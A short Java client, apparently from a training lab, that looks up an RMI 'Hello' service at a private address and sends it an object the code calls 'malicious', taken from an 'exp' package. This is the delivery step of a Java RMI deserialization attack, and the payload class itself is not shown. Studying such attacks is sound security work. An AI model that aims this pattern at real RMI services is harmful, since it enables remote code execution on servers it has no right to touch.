package org.test.client;

import java.rmi.Naming;

import org.test.Server.Hello;

import org.test.exp.PublicKnown;

public class TrainMain {
    public static void main(String[] args) throws Exception {
        Hello hello = (Hello) Naming.lookup("rmi://192.168.247.128:1099/Hello");
        PublicKnown malicious = new PublicKnown();
        String ret = hello.hello(malicious);
        System.out.println(ret);
    }
}